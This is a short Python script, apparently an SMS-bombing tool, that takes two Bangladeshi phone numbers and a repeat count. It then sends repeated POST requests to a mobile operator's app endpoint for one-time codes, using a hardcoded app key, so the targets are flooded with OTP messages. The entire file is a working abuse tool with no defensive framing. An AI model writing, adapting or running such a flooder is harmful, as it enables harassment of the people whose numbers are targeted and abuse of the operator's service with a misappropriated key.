import requests
import json
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"{bcolors.OKBLUE}{bcolors.BOLD}")

print("Number Example 8801234567890")
name = input("Enter 1st Number ")
name2 = input("Enter 2nd Number ")
i=int(input("Enter Counter "))
y=0
while y<i:
    url = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&app_version=75&pin=12345'
    myobj = {'msisdn':name}

#use the 'headers' parameter to set the HTTP headers:
    requests.post(url, data = myobj, headers = {"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})
    myobj2 = {'msisdn':name2}

#use the 'headers' parameter to set the HTTP headers:
    requests.post(url, data = myobj2, headers = {"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})

    y=y+1
    print(y,end =" "),
print("\nCounting Completed")